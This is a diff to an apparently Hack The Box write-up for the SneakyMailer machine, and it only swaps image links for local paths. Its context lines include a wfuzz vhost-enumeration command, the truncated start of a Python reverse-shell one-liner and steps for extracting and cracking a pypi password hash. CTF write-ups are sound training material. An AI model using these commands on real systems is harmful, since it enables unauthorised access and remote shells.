@@ -125,7 +125,7 @@ OYI5rvuAQ+YM9D/Oa6mwAO5l2V3/h/A5nHDx2Vkl1++kfDqFNop2D2vssInvdwLKZ0M5RvXLQPlsqRLf
 
 Checking the website reveals a VHOST sneakycorp.htb:
 
-![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/05fc2ca6-62ac-4388-938f-a77845a8e1a9/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/05fc2ca6-62ac-4388-938f-a77845a8e1a9/Untitled.png)
+![](/assets/img/sneakymailer/image1.png)
 
 ```python
 wfuzz -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.sneakycorp.htb"  --hw 12 -t 100 10.10.10.197
@@ -212,7 +212,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 Using [linEnum.sh](http://linenum.sh) we get pypi's password for htpasswd authentication.
 
-![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/787dd5b4-5290-45e9-8947-30235d6ec7bb/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/787dd5b4-5290-45e9-8947-30235d6ec7bb/Untitled.png)
+![](/assets/img/sneakymailer/image2.png)
 
 Cracking the hash reveals pypi's password.
 
